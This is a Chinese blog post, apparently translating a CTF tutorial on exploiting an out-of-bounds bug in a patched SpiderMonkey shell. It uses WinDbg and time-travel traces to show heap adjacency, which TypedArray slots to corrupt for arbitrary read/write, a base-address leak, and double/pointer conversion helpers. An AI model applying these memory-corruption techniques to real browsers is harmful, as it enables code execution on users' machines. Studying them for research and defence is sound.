<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="“一个不像二进制同学的博客。”"><title>spiderMonkey 漏洞利用简介2 | f01965</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + 'true';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
  </script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">spiderMonkey 漏洞利用简介2</h1><a id="logo" href="/.">f01965</a><p class="description">初闻不知曲中意，再听已是曲中人。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">spiderMonkey 漏洞利用简介2</h1><div class="post-meta">Nov 15, 2020<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" href="/2020/11/15/spiderMonkey-漏洞利用简介2/#vcomment"><span class="valine-comment-count" data-xid="/2020/11/15/spiderMonkey-漏洞利用简介2/"></span><span> 条评论</span></a><div class="post-content"><p>注： 接着上一篇文章，这里讲利用部分。原文链接：<a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#jsvalues-and-jsobjects" target="_blank" rel="noopener">https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#jsvalues-and-jsobjects</a></p>
<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><p>现在我们都是 SpiderMonkey 的专家，让我们来看看实际的挑战。 请注意，显然我们不需要上面的上下文来编写一个简单的漏洞。 当然，只是编写漏洞利用，都不是我的目标。</p>
<h3 id="The-vulnerability"><a href="#The-vulnerability" class="headerlink" title="The vulnerability"></a>The vulnerability</h3><p>仔细看看 <a href="https://github.com/0vercl0k/blazefox/blob/master/blaze.patch" title="blaze.patch" target="_blank" rel="noopener">blaze.patch</a> diff之后，很明显作者已经向 Array 对象添加了一个名为 blaze 的方法。这个新方法将内部大小字段更改为 420 ，因为它毕竟是 Blaze CTF :)。 这允许我们访问缓冲区的越界的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">js&gt; blz = []</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">js&gt; blz.length</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">js&gt; blz.blaze() == undefined</span><br><span class="line">false</span><br><span class="line"></span><br><span class="line">js&gt; blz.length</span><br><span class="line">420</span><br></pre></td></tr></table></figure></p>
<p>使用 js.exe 的<a href="https://github.com/0vercl0k/blazefox/tree/master/js-asserts" title="调试版本" target="_blank" rel="noopener">调试版本</a>时要记住的一个小问题是，您需要确保解释器永远不会显示 blaze’d 对象。如果这样做，数组的toString（）函数遍历每个元素并调用它们的toString（）。一旦你开始越界读，很可能会遇到下面的崩溃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">js&gt; blz.blaze()</span><br><span class="line">Assertion failure: (ptrBits &amp; 0x7) == 0, at c:\Users\over\mozilla-central\js\src\build-release.x64\dist\include\js/Value.h:809</span><br><span class="line"></span><br><span class="line">(1d7c.2b3c): Break instruction exception - code 80000003 (!!! second chance !!!)</span><br><span class="line">*** WARNING: Unable to verify checksum for c:\work\codes\blazefox\js-asserts\js.exe</span><br><span class="line">js!JS::Value::toGCThing+0x75 [inlined in js!JS::MutableHandle&lt;JS::Value&gt;::set+0x97]:</span><br><span class="line">00007ff6`ac86d7d7 cc              int     3</span><br></pre></td></tr></table></figure></p>
<p>解决这个烦恼的一个简单方法是直接向 JavaScript shell 提供文件或使用不返回结果数组的表达式，如 blz.blaze（）== undefined 。 请注意，您自然不会在发布版本中遇到上述断点。</p>
<h3 id="basic-js"><a href="#basic-js" class="headerlink" title="basic.js"></a>basic.js</h3><p>如上所述，我们利用此漏洞的目标是弹出计算器。我们不关心漏洞是多么不可靠或糟糕：我们只想在 JavaScript shell中获得本地代码执行的能力。在这个 exploit 中，我利用了 shell 的调试版本，启用其中的断点。我建议你关注一下，为此我在这里分享了二进制文件（以及符号信息）：<a href="https://github.com/0vercl0k/blazefox/tree/master/js-asserts" title="js-asserts" target="_blank" rel="noopener">js-asserts</a> 。<br>像这样的越界溢出，我们想要的是拥有两个相邻的数组并使用第一个数组来破坏第二个数组。通过这种设置，我们可以将有限的相对存储器读/写访问，转换为任意地址读/写操作。<br>现在，我们必须记住，Arrays 存储的是  js :: Values 而不是原始值。如果你是在 JavaScript 中的溢出的buffer 部分写入值 0x1337，你实际上会在内存中写入值 0xfff8800000001337 。一开始感觉有点奇怪，但你很快习惯了这种类型的东西:-)。<br>我们继续：是时候来观察数组了。为此，我强烈建议抓取一个简单的 JavaScript 文件的执行过程，并进行跟踪，用 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/time-travel-debugging-overview" title="TTD" target="_blank" rel="noopener">TTD</a> 创建数组。跟踪后，您可以在调试器中加载它，以便弄清楚如何分配数组和位置。<br>请注意，要从调试器中检查 JavaScript 对象，我使用我编写的名为 sm.js 的 JavaScript 扩展，您可以在<a href="https://github.com/0vercl0k/windbg-scripts/tree/master/sm" title="此处" target="_blank" rel="noopener">此处</a>找到它。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; bp js!js::math_atan2</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">Time Travel Position: D5DC:D</span><br><span class="line">js!js::math_atan2:</span><br><span class="line">00007ff7`4704e140 56              push    rsi</span><br><span class="line"></span><br><span class="line">0:000&gt; !smdump_jsvalue vp[2].asBits_</span><br><span class="line">25849101b00: js!js::ArrayObject:   Length: 4</span><br><span class="line">25849101b00: js!js::ArrayObject: Capacity: 6</span><br><span class="line">25849101b00: js!js::ArrayObject:  Content: [0x1, 0x2, 0x3, 0x4]</span><br><span class="line">@$smdump_jsvalue(vp[2].asBits_)</span><br><span class="line"></span><br><span class="line">0:000&gt;  dx -g @$cursession.TTD.Calls(&quot;js!js::allocate&lt;JSObject,js::NoGC&gt;&quot;).Where(p =&gt; p.ReturnValue == 0x25849101b00)</span><br><span class="line">=====================================================================================================================================================================================================================</span><br><span class="line">=           = (+) EventType = (+) ThreadId = (+) UniqueThreadId = (+) TimeStart = (+) TimeEnd = (+) Function                          = (+) FunctionAddress = (+) ReturnAddress = (+) ReturnValue  = (+) Parameters =</span><br><span class="line">=====================================================================================================================================================================================================================</span><br><span class="line">= [0x14]    - Call          - 0x32f8       - 0x2                - D58F:723      - D58F:77C    - js!js::Allocate&lt;JSObject,js::NoGC&gt;    - 0x7ff746f841b0      - 0x7ff746b4b702    - 0x25849101b00    - &#123;...&#125;          =</span><br><span class="line">=====================================================================================================================================================================================================================</span><br><span class="line"></span><br><span class="line">0:000&gt; !tt D58F:723 </span><br><span class="line">Setting position: D58F:723</span><br><span class="line">Time Travel Position: D58F:723</span><br><span class="line">js!js::Allocate&lt;JSObject,js::NoGC&gt;:</span><br><span class="line">00007ff7`46f841b0 4883ec28        sub     rsp,28h</span><br><span class="line"></span><br><span class="line">0:000&gt; kc</span><br><span class="line"> # Call Site</span><br><span class="line">00 js!js::Allocate&lt;JSObject,js::NoGC&gt;</span><br><span class="line">01 js!js::NewObjectCache::newObjectFromHit</span><br><span class="line">02 js!NewArrayTryUseGroup&lt;4294967295&gt;</span><br><span class="line">03 js!js::NewCopiedArrayForCallingAllocationSite</span><br><span class="line">04 js!ArrayConstructorImpl</span><br><span class="line">05 js!js::ArrayConstructor</span><br><span class="line">06 js!InternalConstruct</span><br><span class="line">07 js!Interpret</span><br><span class="line">08 js!js::RunScript</span><br><span class="line">09 js!js::ExecuteKernel</span><br><span class="line">0a js!js::Execute</span><br><span class="line">0b js!JS_ExecuteScript</span><br><span class="line">0c js!Process</span><br><span class="line">0d js!main</span><br><span class="line">0e js!__scrt_common_main_seh</span><br><span class="line">0f KERNEL32!BaseThreadInitThunk</span><br><span class="line">10 ntdll!RtlUserThreadStart</span><br><span class="line"></span><br><span class="line">0:000&gt; dv</span><br><span class="line">           kind = OBJECT8_BACKGROUND (0n9)</span><br><span class="line">  nDynamicSlots = 0</span><br><span class="line">           heap = DefaultHeap (0n0)</span><br></pre></td></tr></table></figure></p>
<p>cool~ 根据以上所述，新的数组（1,2,3,4）从 Nursery 堆（或 DefaultHeap）分配，并且是OBJECT8_BACKGROUND 。 这种对象长度为 0x60 字节，如下所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; x js!js::gc::Arena::ThingSizes</span><br><span class="line">00007ff7`474415b0 js!js::gc::Arena::ThingSizes = &lt;no type information&gt;</span><br><span class="line"></span><br><span class="line">0:000&gt; dds 00007ff7`474415b0 + 9*4 l1</span><br><span class="line">00007ff7`474415d4  00000060</span><br></pre></td></tr></table></figure></p>
<p>Nursery 堆最多为 16MB（默认情况下，但可以使用 –nursery-size 选项进行调整）。对于我们这个分配器来说，有一件好事就是没有任何随机化。如果我们分配两个数组，它们很可能在内存中相邻。 另一个很棒的事情是 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray" title="TypedArrays" target="_blank" rel="noopener">TypedArrays</a> 也在那里分配。</p>
<p>作为第一个实验，我们可以尝试在内存中使用 Array 和 TypedArray，并在调试器中进行确认。 如你所见，下面是我的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const Smalls = new Array(1, 2, 3, 4);</span><br><span class="line">const U8A = new Uint8Array(8);</span><br></pre></td></tr></table></figure></p>
<p>我们现在从调试器中查看它：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(2ab8.22d4): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">00007fff`b8c33050 cc              int     3</span><br><span class="line">0:005&gt; bp js!js::math_atan2</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">js!js::math_atan2:</span><br><span class="line">00007ff7`4704e140 56              push    rsi</span><br><span class="line"></span><br><span class="line">0:000&gt; ?? vp[2].asBits_</span><br><span class="line">unsigned int64 0xfffe013e`bb2019e0</span><br><span class="line"></span><br><span class="line">0:000&gt; .scriptload c:\work\codes\blazefox\sm\sm.js</span><br><span class="line">JavaScript script successfully loaded from &apos;c:\work\codes\blazefox\sm\sm.js&apos;</span><br><span class="line"></span><br><span class="line">0:000&gt; !smdump_jsvalue vp[2].asBits_</span><br><span class="line">13ebb2019e0: js!js::ArrayObject:   Length: 4</span><br><span class="line">13ebb2019e0: js!js::ArrayObject: Capacity: 6</span><br><span class="line">13ebb2019e0: js!js::ArrayObject:  Content: [0x1, 0x2, 0x3, 0x4]</span><br><span class="line">@$smdump_jsvalue(vp[2].asBits_)</span><br><span class="line"></span><br><span class="line">0:000&gt; ? 0xfffe013e`bb2019e0 + 60</span><br><span class="line">Evaluate expression: -561581014377920 = fffe013e`bb201a40</span><br><span class="line"></span><br><span class="line">0:000&gt; !smdump_jsvalue 0xfffe013ebb201a40</span><br><span class="line">13ebb201a40: js!js::TypedArrayObject:       Type: Uint8Array</span><br><span class="line">13ebb201a40: js!js::TypedArrayObject:     Length: 8</span><br><span class="line">13ebb201a40: js!js::TypedArrayObject: ByteLength: 8</span><br><span class="line">13ebb201a40: js!js::TypedArrayObject: ByteOffset: 0</span><br><span class="line">13ebb201a40: js!js::TypedArrayObject:    Content: Uint8Array(&#123;Length:8, ...&#125;)</span><br><span class="line">@$smdump_jsvalue(0xfffe013ebb201a40)</span><br></pre></td></tr></table></figure></p>
<p>Cool~ 检查出：数组（大小为 0x60 字节）与 TypedArray 相邻。那么，在我编译 JavaScript shell 的<a href="https://github.com/0vercl0k/blazefox/tree/master/js-asserts" title="调试版本" target="_blank" rel="noopener">调试版本</a>和编译<a href="https://github.com/0vercl0k/blazefox/tree/master/js-release" title="发布版本" target="_blank" rel="noopener">发布版本</a>的时候，这可能是一个很好的时机让我告诉你一些事：一些核心结构略有改变，这意味着如果你在调试上使用 sm.js 它将无法工作:)。这是一个如下所示的变化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:008&gt; dt js::Shape</span><br><span class="line">   +0x000 base_            : js::GCPtr&lt;js::BaseShape *&gt;</span><br><span class="line">   +0x008 propid_          : js::PreBarriered&lt;jsid&gt;</span><br><span class="line">   +0x010 slotInfo         : Uint4B</span><br><span class="line">   +0x014 attrs            : UChar</span><br><span class="line">   +0x015 flags            : UChar</span><br><span class="line">   +0x018 parent           : js::GCPtr&lt;js::Shape *&gt;</span><br><span class="line">   +0x020 kids             : js::KidsPointer</span><br><span class="line">   +0x020 listp            : Ptr64 js::GCPtr&lt;js::Shape *&gt;</span><br><span class="line"></span><br><span class="line">VS</span><br><span class="line"></span><br><span class="line">0:000&gt; dt js::Shape</span><br><span class="line">   +0x000 base_            : js::GCPtr&lt;js::BaseShape *&gt;</span><br><span class="line">   +0x008 propid_          : js::PreBarriered&lt;jsid&gt;</span><br><span class="line">   +0x010 immutableFlags   : Uint4B</span><br><span class="line">   +0x014 attrs            : UChar</span><br><span class="line">   +0x015 mutableFlags     : UChar</span><br><span class="line">   +0x018 parent           : js::GCPtr&lt;js::Shape *&gt;</span><br><span class="line">   +0x020 kids             : js::KidsPointer</span><br><span class="line">   +0x020 listp            : Ptr64 js::GCPtr&lt;js::Shape *&gt;</span><br></pre></td></tr></table></figure></p>
<p>由于我们想要破坏相邻的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays" title="TypedArray" target="_blank" rel="noopener">TypedArray</a>，我们应该看看它的布局。我们感兴趣的是破坏这样的对象以便能够完全控制内存。不再编写受控的 js :: Value，但实际的原始字节对我们来说非常有用。对于那些不熟悉 TypedArray 的人来说，它们是 JavaScript 对象，允许您像使用 C 数组一样访问原始二进制数据。例如，<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint32Array" title="Uint32Array" target="_blank" rel="noopener">Uint32Array</a> 为您提供了一种访问原始 uint32_t 数据的机制， <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array" title="Uint8Array" target="_blank" rel="noopener">Uint8Array</a> 用于 uint8_t 数据等。   </p>
<p>通过查看源代码，我们了解到 TypedArrays 是 js :: TypedArrayObject，它们是 js :: ArrayBufferViewObject 的子类。 我们想知道的基本上是缓冲区大小和缓冲区指针存储在哪个 slot 中（这样我们就可以替换它们）：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayBufferViewObject</span> :</span> <span class="keyword">public</span> NativeObject</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Underlying (Shared)ArrayBufferObject.</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">size_t</span> BUFFER_SLOT = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Slot containing length of the view in number of typed elements.</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">size_t</span> LENGTH_SLOT = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Offset of view within underlying (Shared)ArrayBufferObject.</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">size_t</span> BYTEOFFSET_SLOT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">size_t</span> DATA_SLOT = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TypedArrayObject</span> :</span> <span class="keyword">public</span> ArrayBufferViewObject</span><br></pre></td></tr></table></figure></p>
<p>真棒。 这是它在调试器中的样子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; ?? vp[2]</span><br><span class="line">union JS::Value</span><br><span class="line">   +0x000 asBits_          : 0xfffe0216`3cb019e0</span><br><span class="line">   +0x000 asDouble_        : -1.#QNAN </span><br><span class="line">   +0x000 s_               : JS::Value::&lt;unnamed-type-s_&gt;</span><br><span class="line"></span><br><span class="line">0:000&gt; dt js::NativeObject 216`3cb019e0</span><br><span class="line">   +0x000 group_           : js::GCPtr&lt;js::ObjectGroup *&gt;</span><br><span class="line">   +0x008 shapeOrExpando_  : 0x00000216`3ccac948 Void</span><br><span class="line">   +0x010 slots_           : (null) </span><br><span class="line">   +0x018 elements_        : 0x00007ff7`f7ecdac0 js::HeapSlot</span><br><span class="line"></span><br><span class="line">0:000&gt; dqs 216`3cb019e0</span><br><span class="line">00000216`3cb019e0  00000216`3cc7ac70</span><br><span class="line">00000216`3cb019e8  00000216`3ccac948</span><br><span class="line">00000216`3cb019f0  00000000`00000000</span><br><span class="line">00000216`3cb019f8  00007ff7`f7ecdac0 js!emptyElementsHeader+0x10</span><br><span class="line">00000216`3cb01a00  fffa0000`00000000 &lt;- BUFFER_SLOT</span><br><span class="line">00000216`3cb01a08  fff88000`00000008 &lt;- LENGTH_SLOT</span><br><span class="line">00000216`3cb01a10  fff88000`00000000 &lt;- BYTEOFFSET_SLOT</span><br><span class="line">00000216`3cb01a18  00000216`3cb01a20 &lt;- DATA_SLOT</span><br><span class="line">00000216`3cb01a20  00000000`00000000 &lt;- Inline data (8 bytes)</span><br></pre></td></tr></table></figure></p>
<p>如您所见，长度是一个 js :: Value，指向数组内联缓冲区的指针是一个原始指针。 同样方便的是 elements_field 指向 JavaScript 引擎二进制文件的 .rdata 部分（使用 JavaScript Shell 时为 js.exe，使用 Firefox 时为xul.dll）。 我们用它来泄漏模块的基地址。<br>考虑到这一点，我们可以开始编写 exploit 的利用代码：</p>
<ul>
<li>我们可以通过读取 TypedArray 的 elements_ 字段来泄漏 js.exe 的基址。</li>
<li>我们可以通过破坏 DATA_SLOT 然后通过 TypedArray 读取/写入来创建绝对内存访问代码（如果需要也可以破坏LENGTH_SLOT）。<br>现在，您可能想知道我们将如何通过存储 js :: Value 的 Array 读取原始指针？ 如果我们将用户模式指针读作 js :: Value ，您认为会发生什么？   </li>
</ul>
<p>为了回答这个问题，我认为现在是坐下来看看 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Double_precision" title="IEEE754" target="_blank" rel="noopener">IEEE754</a> 标准，并且在 js :: Value 中编码双精度的方式，希望找出上述操作是否安全。js :: Value 中被认为最大的 double 数据是 0x1fff0 &lt;&lt; 47 = 0xfff8000000000000 。而且所有较小的数据也被视为 double 数据。0x1fff0 是 JSVAL_TAG_MAX_DOUBLE 标记。再简单的说，你可以认为你能将指针从0x0000000000000000 编码为 0xfff8000000000000 作为js :: Value double。根据 IEEE754 编码的双精度方式是你有 52 位  fraction，11 位 exponent 和 1 位 sign 。该标准还定义了一组特殊值，例如： NaN 或 Infinity 。 让我们一个接一个地来分析。</p>
<p>NaN 通过遵循相同规则的几个位模式表示：它们都有一个 exponent 位设置为 1，除了所有 0 位之外，fraction 部分可以是所有内容。这给了我们以下 NaN 范围：<strong>[0x7ff0000000000001, 0xffffffffffffffff]</strong> 请参阅以下详细信息：</p>
<ul>
<li>0x7ff0000000000001 是最小的 NaN，sign = 0，exp =1*11，frac =0* 51 + 1：<br>– 0b0111111111110000000000000000000000000000000000000000000000000001</li>
<li>0xfff0000000000000 是 -Infinity with sign=1, exp=1*11, frac=0*52<br>– 0b1111111111110000000000000000000000000000000000000000000000000000</li>
</ul>
<p>还有两个零值。 正负值，值为 0x0000000000000000 和 0x8000000000000000 。 请参阅以下详细信息：</p>
<ul>
<li>0x0000000000000000 是 +0 ， sign=0, exp=0*11, frac=0*52:<br>– 0b0000000000000000000000000000000000000000000000000000000000000000</li>
<li>0x8000000000000000 是 -0 ， sign=1, exp=0*11, frac=0*52:<br>– 0b1000000000000000000000000000000000000000000000000000000000000000<br>NaN 的值对我们写利用来说很烦，因为如果我们通过 js :: Value 泄漏原始指针，我们无法判断它的值是否为0x7ff0000000000001 ， 0xffffffffffffffff 或介于两者之间的任何值。其余的特殊值就很好，它们的编码与含义是1：1匹配的。在 64 位的 windows 进程中，用户模式下的虚拟地址空间是 128TB ，从 0x0000000000000000 到0x00007fffffffffff 。好消息是 NaN 范围与用户模式指针的所有可能值之间是没有交集的。这意味着我们可以通过 js :: Value 对象来安全的泄漏它们。</li>
</ul>
<p>如果您想更多地使用上面说讲的内容，可以在 JavaScript Shell 中使用以下函数：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b2f</span>(<span class="params">A</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(A.length != <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">'Needs to be an 8 bytes long array'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(A);</span><br><span class="line">    <span class="keyword">const</span> Doubles = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(Bytes.buffer);</span><br><span class="line">    <span class="keyword">return</span> Doubles[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2b</span>(<span class="params">A</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> Doubles = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    Doubles[<span class="number">0</span>] = A;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(Doubles.buffer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>你可以看到如下输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// +Infinity</span><br><span class="line">js&gt; f2b(b2f([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x7f]))</span><br><span class="line">[0, 0, 0, 0, 0, 0, 240, 127]</span><br><span class="line"></span><br><span class="line">// -Infinity</span><br><span class="line">js&gt; f2b(b2f([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xff]))</span><br><span class="line">[0, 0, 0, 0, 0, 0, 240, 255]</span><br><span class="line"></span><br><span class="line">// NaN smallest</span><br><span class="line">js&gt; f2b(b2f([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x7f]))</span><br><span class="line">[0, 0, 0, 0, 0, 0, 248, 127]</span><br><span class="line"></span><br><span class="line">// NaN biggest</span><br><span class="line">js&gt; f2b(b2f([0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]))</span><br><span class="line">[0, 0, 0, 0, 0, 0, 248, 127]</span><br></pre></td></tr></table></figure></p>
